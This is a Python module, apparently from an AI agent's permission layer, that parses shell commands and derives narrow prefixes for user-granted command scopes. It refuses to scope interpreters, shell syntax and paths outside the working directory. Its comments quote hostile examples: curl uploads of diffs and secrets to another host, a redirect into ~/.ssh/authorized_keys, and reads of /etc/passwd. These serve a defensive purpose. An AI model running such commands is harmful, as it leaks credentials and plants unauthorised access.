"""The words a command-scoped grant is recorded under and matched by.

Read strictly, on the guards' parser: only plain commands joined by lists and pipelines,
every word literal, every path inside the working directory. Anything else has no scope, so
a grant can't be recorded from it or cover it, and the operator answers it each time.
"""

from __future__ import annotations

import re

from tree_sitter import Node

from services.permissions.shell_ast import ShellCommand, decode_word, node_text, parse, unwrap
from services.permissions.shell_flags import is_flag

#: Operands a scope keeps after the program: `uv run pytest`, `git commit`.
_PREFIX_WORDS = 3

_STRUCTURE = frozenset({"program", "list", "pipeline"})
_JOINERS = frozenset({"&&", "||", "|", ";", "\n", "comment"})
_LITERAL = frozenset({"word", "number", "raw_string", "string", "concatenation"})
#: Characters the shell rewrites in a bare word (expansion, globbing, escapes) before the
#: program sees it.
_REWRITTEN = frozenset("$`\\*?[]{}")
#: Shell syntax a program could run as a command line of its own.
_SYNTAX = frozenset(";|&<>()$`\n")
#: What separates one path from the next inside a word: anything a path can't contain.
_PATH_FRAGMENT = re.compile(r"[^\w./~-]+")
#: A URL's scheme, dropped before measuring so `https://host/x` reads as a host and a
#: path, and `file:///etc/passwd` still as an absolute path.
_URL_SCHEME = re.compile(r"\b[a-zA-Z][\w+.-]*://")
_FLAG_LETTERS = re.compile(r"^-+[A-Za-z]*")
#: Programs that run a script given inline. A scope on one (`sh -c`) would name the
#: interpreter and cover any script, so a call to one, wrapped or not, has no scope.
_INTERPRETERS = re.compile(
    "|".join(
        (
            r"(?:ba|z|da|k|fi|tc|c)?sh",
            r"python[\d.]*",
            r"lua[\d.]*",
            r"[gm]?awk",
            "node|deno|bun|perl|ruby|php|tclsh|pwsh|osascript|Rscript|busybox",
            r"eval|source|\.",
        )
    )
)


def command_prefixes(command: str) -> tuple[tuple[str, ...], ...] | None:
    """The leading words that name what each stage of ``command`` does, or None when the
    command can't be scoped.

    Per stage: the program, the flags written in front of its operands, and the operands up
    to :data:`_PREFIX_WORDS` of them. **Every stage, not just the first**: `git diff | curl
    -T - https://…` diffs at its head and uploads at its tail, so a caller matching standing
    scopes must satisfy every prefix.

    None where nothing may be inferred: a construct other than a plain command, a word the
    shell fills in or rewrites, an assignment, or **a path outside the working directory**,
    measured word by word inside a quoted argument too. `uv run pytest` and `uv run pytest >
    ~/.ssh/authorized_keys` share leading words but are different acts.
    """
    commands: list[ShellCommand] = []
    if not _collect(parse(command), commands) or not commands:
        return None
    return tuple(_leading_words(one) for one in commands)


def _collect(node: Node, into: list[ShellCommand]) -> bool:
    """Append the plain commands under ``node`` to ``into``; False on anything else."""
    if node.type in _STRUCTURE:
        return all(_collect(child, into) for child in node.children if child.type not in _JOINERS)
    if node.type == "redirected_statement":
        body = node.child_by_field_name("body")
        redirects = [child for child in node.children if child != body]
        return (
            body is not None
            and all(_redirect_inside(child) for child in redirects)
            and _collect(body, into)
        )
    if node.type != "command":
        return False
    words: list[str] = []
    for child in node.children:
        target = child.children[0] if child.type == "command_name" and child.child_count else child
        word = _literal(target)
        if word is None or _outside(word):
            return False
        words.append(word)
    if not words or not words[0] or any(c.isspace() for c in words[0]):
        return False
    one = ShellCommand(words[0], tuple(words[1:]))
    if any(_INTERPRETERS.fullmatch(c.program.rsplit("/", 1)[-1]) for c in (one, unwrap(one))):
        return False
    into.append(one)
    return True


def _redirect_inside(node: Node) -> bool:
    if node.type != "file_redirect":
        return False
    target = node.child_by_field_name("destination")
    word = _literal(target) if target is not None else None
    return word is not None and not _outside(word)


def _literal(node: Node) -> str | None:
    """The text a literal argument hands its program, or None when the shell decides it."""
    if node.type not in _LITERAL:
        return None
    if node.type == "concatenation":
        parts = [_literal(child) for child in node.children]
        return None if any(p is None for p in parts) else "".join(p for p in parts if p)
    if node.type == "string":
        if any(child.type != "string_content" for child in node.named_children):
            return None
    elif node.type != "raw_string" and set(node_text(node)) & _REWRITTEN:
        return None
    return decode_word(node)


def _outside(word: str) -> bool:
    """Whether ``word`` carries shell syntax, or names a path outside the working directory
    anywhere in it: each run of path characters is measured on its own, so a path glued to a
    quote (`cat "/etc/passwd"` inside a script) or after an `=` is still seen."""
    if set(word) & _SYNTAX:
        return True
    for fragment in _PATH_FRAGMENT.split(_URL_SCHEME.sub("", word)):
        # A short flag's value can be glued on (`-o/etc/x`, `-C../x`).
        value = _FLAG_LETTERS.sub("", fragment)
        if value.startswith(("/", "~")) or ".." in value.split("/"):
            return True
    return False


def _leading_words(command: ShellCommand) -> tuple[str, ...]:
    """One command's program, the flags in front of its operands, and those operands,
    capped at :data:`_PREFIX_WORDS` of them.

    **A flag is part of the act, not a terminator.** Ending the prefix at the first `-` made
    every flag-led curl read as `("curl",)`, so one yes to an API fetch covered `curl -d
    @secrets https://elsewhere`. Keeping the flag narrows the scope; what the cap withholds is
    the target, which is an operand.

    A scope shorter than the cap covers only a command of exactly that shape: `ls -la` reads
    as `("ls", "-la")` and `ls -la src` matches it nowhere.

    An empty argument or one carrying whitespace ends the prefix like the cap does, so `git
    commit -m 'x'` scopes to any message.
    """
    words = [command.program]
    operands = 1
    for argument in command.arguments:
        if not argument or operands >= _PREFIX_WORDS or any(c.isspace() for c in argument):
            break
        words.append(argument)
        if not is_flag(argument):
            operands += 1
    return tuple(words)
